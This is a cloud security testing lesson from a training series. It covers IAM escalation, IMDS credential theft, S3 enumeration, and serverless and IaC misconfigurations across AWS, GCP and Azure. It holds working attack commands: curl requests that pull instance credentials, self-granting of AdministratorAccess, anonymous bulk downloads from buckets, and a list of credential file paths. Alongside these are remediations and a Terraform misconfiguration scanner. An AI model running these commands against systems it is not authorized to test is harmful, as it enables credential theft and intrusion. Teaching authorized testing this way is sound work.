# Cloud Security Testing

**Previous**: [16. Wireless Security](./16_Wireless_Security.md) | **Next**: [18. Malware Analysis](./18_Malware_Analysis.md)

---

As organizations migrate to cloud platforms, the attack surface shifts from on-premise networks to cloud services and APIs. This lesson covers the unique security challenges of AWS, GCP, and Azure, including IAM misconfigurations, metadata service exploitation, storage bucket enumeration, and serverless function attacks.

> **IMPORTANT**: Only test cloud resources you own or have explicit authorization to assess.

**Difficulty**: ⭐⭐⭐⭐

## Learning Objectives

1. Understand the shared responsibility model for cloud security
2. Enumerate and exploit IAM misconfigurations in AWS
3. Exploit IMDS to steal credentials and escalate privileges
4. Discover and exploit publicly accessible S3 buckets
5. Attack serverless functions (Lambda, Cloud Functions)
6. Identify cloud infrastructure misconfigurations
7. Test Terraform and IaC configurations for security issues
8. Implement cloud security best practices

---

## Table of Contents

1. [Cloud Security Fundamentals](#1-cloud-security-fundamentals)
2. [AWS IAM Exploitation](#2-aws-iam-exploitation)
3. [Instance Metadata Service (IMDS) Attacks](#3-instance-metadata-service-imds-attacks)
4. [S3 Bucket Enumeration and Exploitation](#4-s3-bucket-enumeration-and-exploitation)
5. [Lambda and Serverless Attacks](#5-lambda-and-serverless-attacks)
6. [GCP Security Testing](#6-gcp-security-testing)
7. [Azure Security Testing](#7-azure-security-testing)
8. [Cloud Credential Theft](#8-cloud-credential-theft)
9. [Terraform and IaC Misconfigurations](#9-terraform-and-iac-misconfigurations)
10. [Cloud Security Tools and Frameworks](#10-cloud-security-tools-and-frameworks)
11. [Exercises](#11-exercises)
12. [Summary](#12-summary)
13. [References](#13-references)

---

## 1. Cloud Security Fundamentals

### 1.1 Shared Responsibility Model

```
Customer Responsibility ("Security IN the cloud"):
├── Data, encryption, identity management
├── Application security, IAM policies
├── Network configuration, security groups
└── OS patches (EC2), client-side encryption

Provider Responsibility ("Security OF the cloud"):
├── Physical infrastructure
├── Hypervisor, network infrastructure
├── Managed service security
└── Global infrastructure (regions, AZs)
```

---

## 2. AWS IAM Exploitation

```python
"""
AWS IAM enumeration and analysis module.

Identifies IAM misconfigurations that could lead to
privilege escalation in authorized cloud assessments.
"""

from dataclasses import dataclass, field


@dataclass
class IAMFinding:
    """An IAM security finding."""
    principal: str
    issue: str
    severity: str
    exploitation: str
    remediation: str


# Common IAM privilege escalation paths
IAM_ESCALATION_PATHS = [
    IAMFinding(
        principal="User with iam:CreatePolicyVersion",
        issue="Can create new policy versions with Admin access",
        severity="Critical",
        exploitation="Create policy version with Action:* Resource:*",
        remediation="Restrict iam:CreatePolicyVersion to admins only",
    ),
    IAMFinding(
        principal="User with iam:AttachUserPolicy",
        issue="Can attach AdministratorAccess to self",
        severity="Critical",
        exploitation="aws iam attach-user-policy --user-name self --policy-arn arn:aws:iam::aws:policy/AdministratorAccess",
        remediation="Use permission boundaries",
    ),
    IAMFinding(
        principal="User with iam:PassRole + lambda:CreateFunction",
        issue="Can create Lambda with any role",
        severity="High",
        exploitation="Create Lambda with admin role, invoke to escalate",
        remediation="Restrict iam:PassRole with conditions",
    ),
    IAMFinding(
        principal="User with sts:AssumeRole on high-privilege role",
        issue="Can assume admin role",
        severity="High",
        exploitation="aws sts assume-role --role-arn <admin-role>",
        remediation="Restrict trust policies, require MFA",
    ),
]


if __name__ == "__main__":
    print("AWS IAM Escalation Paths")
    print("=" * 60)
    for f in IAM_ESCALATION_PATHS:
        print(f"\n[{f.severity}] {f.principal}")
        print(f"  Issue: {f.issue}")
        print(f"  Exploit: {f.exploitation}")
        print(f"  Fix: {f.remediation}")
```

```bash
# AWS IAM enumeration
aws iam get-user
aws iam list-users
aws iam list-roles
aws iam list-attached-user-policies --user-name <user>
aws iam get-policy-version --policy-arn <arn> --version-id v1

# Check what you can do
aws sts get-caller-identity
# Use enumerate-iam tool for comprehensive checks
```

---

## 3. Instance Metadata Service (IMDS) Attacks

IMDS provides instance metadata including IAM credentials at `http://169.254.169.254/`.

```bash
# AWS IMDSv1 (no authentication required)
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>

# Returns: AccessKeyId, SecretAccessKey, Token

# GCP metadata
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/

# Azure IMDS
curl -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
```

### 3.1 SSRF to IMDS

The most common cloud exploitation path: SSRF vulnerability → IMDS → credential theft → privilege escalation.

---

## 4. S3 Bucket Enumeration and Exploitation

```bash
# Check if bucket exists and is public
aws s3 ls s3://target-bucket --no-sign-request

# List bucket contents
aws s3 ls s3://target-bucket/ --no-sign-request --recursive

# Download all files
aws s3 sync s3://target-bucket ./downloaded --no-sign-request

# Check bucket ACL
aws s3api get-bucket-acl --bucket target-bucket

# Common bucket name patterns to test
# {company}-backup, {company}-dev, {company}-logs, {company}-data
```

---

## 5. Lambda and Serverless Attacks

### 5.1 Lambda Attack Vectors

- **Event injection**: Malicious input in Lambda event data
- **Dependency confusion**: Supply chain attacks on Lambda layers
- **Environment variable leakage**: Secrets stored in env vars
- **Excessive permissions**: Lambda role with broad IAM permissions
- **Code injection**: If Lambda processes user-controlled code

---

## 6. GCP Security Testing

```bash
# GCP enumeration
gcloud projects list
gcloud iam service-accounts list
gcloud compute instances list
gcloud storage ls

# Service account key theft
gcloud iam service-accounts keys list --iam-account=<sa>
```

---

## 7. Azure Security Testing

```bash
# Azure enumeration
az account list
az ad user list
az vm list
az storage account list

# Azure AD enumeration
az ad sp list --all
az role assignment list
```

---

## 8. Cloud Credential Theft

Common locations for cloud credentials:

```bash
# AWS
~/.aws/credentials
~/.aws/config
Environment variables: AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY

# GCP
~/.config/gcloud/
Application Default Credentials
Service account key files (*.json)

# Azure
~/.azure/
Environment variables: AZURE_CLIENT_ID, AZURE_CLIENT_SECRET
```

---

## 9. Terraform and IaC Misconfigurations

```python
"""
Infrastructure as Code (IaC) security checker.

Identifies common security misconfigurations in
Terraform configurations.
"""

from dataclasses import dataclass
import re


@dataclass
class IaCFinding:
    """A security finding in IaC configuration."""
    file: str
    line: int
    rule: str
    severity: str
    description: str
    remediation: str


# Common Terraform misconfigurations
TERRAFORM_RULES = [
    {
        "pattern": r'ingress\s*\{[^}]*cidr_blocks\s*=\s*\["0\.0\.0\.0/0"\]',
        "rule": "Open security group ingress",
        "severity": "High",
        "description": "Security group allows traffic from any IP",
        "remediation": "Restrict CIDR blocks to known IP ranges",
    },
    {
        "pattern": r'acl\s*=\s*"public-read"',
        "rule": "Public S3 bucket",
        "severity": "Critical",
        "description": "S3 bucket is publicly readable",
        "remediation": "Set acl = 'private' and use bucket policies",
    },
    {
        "pattern": r'encrypted\s*=\s*false',
        "rule": "Unencrypted storage",
        "severity": "High",
        "description": "Storage resource is not encrypted",
        "remediation": "Enable encryption at rest",
    },
    {
        "pattern": r'versioning\s*\{[^}]*enabled\s*=\s*false',
        "rule": "S3 versioning disabled",
        "severity": "Medium",
        "description": "S3 bucket versioning is disabled",
        "remediation": "Enable versioning for data protection",
    },
]


def check_terraform_file(content: str, filename: str = "main.tf") -> list[IaCFinding]:
    """Check a Terraform file for common misconfigurations."""
    findings = []
    for rule in TERRAFORM_RULES:
        for match in re.finditer(rule["pattern"], content, re.DOTALL):
            line = content[:match.start()].count('\n') + 1
            findings.append(IaCFinding(
                file=filename, line=line,
                rule=rule["rule"],
                severity=rule["severity"],
                description=rule["description"],
                remediation=rule["remediation"],
            ))
    return findings


if __name__ == "__main__":
    print("Terraform Security Checker")
    print("=" * 50)
    print("Tools for IaC scanning:")
    print("  - tfsec: Static analysis for Terraform")
    print("  - checkov: Multi-framework IaC scanner")
    print("  - terrascan: Policy as code for IaC")
    print("  - ScoutSuite: Multi-cloud auditing")
```

---

## 10. Cloud Security Tools and Frameworks

| Tool | Purpose | Clouds |
|------|---------|--------|
| ScoutSuite | Multi-cloud security audit | AWS, GCP, Azure |
| Prowler | AWS security assessment | AWS |
| CloudSploit | Cloud misconfiguration scanner | Multi-cloud |
| Pacu | AWS exploitation framework | AWS |
| enumerate-iam | IAM permission enumeration | AWS |
| tfsec | Terraform security scanner | All |
| Steampipe | SQL queries against cloud APIs | Multi-cloud |

---

## 11. Exercises

1. **S3 Enumeration**: Search for publicly accessible S3 buckets belonging to your test organization.
2. **IMDS Exploitation**: Exploit an SSRF vulnerability to access the AWS metadata service in a lab environment.
3. **IAM Analysis**: Enumerate IAM policies and identify privilege escalation paths using Pacu.
4. **IaC Scanning**: Run tfsec against a Terraform project and remediate all findings.
5. **Cloud Audit**: Run ScoutSuite against your own AWS account and generate a security report.
6. **Full Chain**: Exploit an SSRF → IMDS → credential theft → privilege escalation chain.

---

## 12. Summary

Cloud security testing targets the modern attack surface:

- **Shared responsibility model** defines customer vs provider security obligations
- **IAM misconfigurations** are the most common cloud vulnerability
- **IMDS attacks** steal credentials from cloud instances
- **Public S3 buckets** expose sensitive data
- **Serverless functions** introduce new attack vectors
- **IaC scanning** catches misconfigurations before deployment
- Defense requires least privilege IAM, IMDSv2, and continuous monitoring

---

## 13. References

- AWS Security Documentation: https://docs.aws.amazon.com/security/
- Pacu (AWS Exploitation): https://github.com/RhinoSecurityLabs/pacu
- ScoutSuite: https://github.com/nccgroup/ScoutSuite
- HackTricks Cloud: https://cloud.hacktricks.xyz/
- Prowler: https://github.com/prowler-cloud/prowler
- OWASP Cloud Security: https://owasp.org/www-project-cloud-security/
